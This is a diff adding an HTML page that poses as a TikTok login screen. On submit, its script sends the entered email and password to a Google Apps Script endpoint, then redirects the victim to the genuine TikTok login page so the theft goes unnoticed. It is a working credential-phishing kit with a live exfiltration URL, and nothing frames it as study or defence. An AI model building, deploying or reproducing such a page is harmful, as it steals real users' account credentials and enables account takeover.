@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8f8f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+            background: black;
+            border-radius: 50%;
+            position: relative;
+            display: inline-block;
+        }
+        .logo::before, .logo::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: white;
+        }
+        .logo::after {
+            width: 15px;
+            height: 15px;
+            background: #fe2c55;
+            z-index: 1;
+        }
+        h2 {
+            margin: 0 0 20px 0;
+            color: #121212;
+            font-size: 24px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #fe2c55;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #e91e4d;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #fe2c55;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .error-msg {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo"></div>
+    <h2>Welcome back</h2>
+    
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="Phone number, email, or username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        
+        <button type="submit" id="submitBtn">Log In</button>
+        
+        <div class="spinner" id="spinner"></div>
+        <div class="error-msg" id="errorMsg"></div>
+    </form>
+    
+    <div class="footer">
+        <p><a href="#" style="color:#999; text-decoration:none;">Forgot password?</a></p>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const spinner = document.getElementById('spinner');
+        const btn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        
+        spinner.style.display = 'block';
+        btn.disabled = true;
+        errorMsg.style.display = 'none';
+
+        const payload = {
+            email: email,
+            password: password,
+            twoFA: "" 
+        };
+
+        // YOUR SPECIFIC GOOGLE SCRIPT URL IS HERE
+        const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbxbx-9vy08WS2m8bd2fAspkS5K7hDNqcrFGOzKt6VM0k_dCueS9OZfOwoMxnTBofc-GHQ/exec';
+
+        fetch(googleScriptUrl, {
+            method: 'POST',
+            body: JSON.stringify(payload),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Data sent:", data);
+            window.location.href = 'https://www.tiktok.com/login';
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            errorMsg.textContent = "Network error. Please try again.";
+            errorMsg.style.display = 'block';
+            spinner.style.display = 'none';
+            btn.disabled = false;
+        });
+    });
+</script>
+
+</body>
+</html>
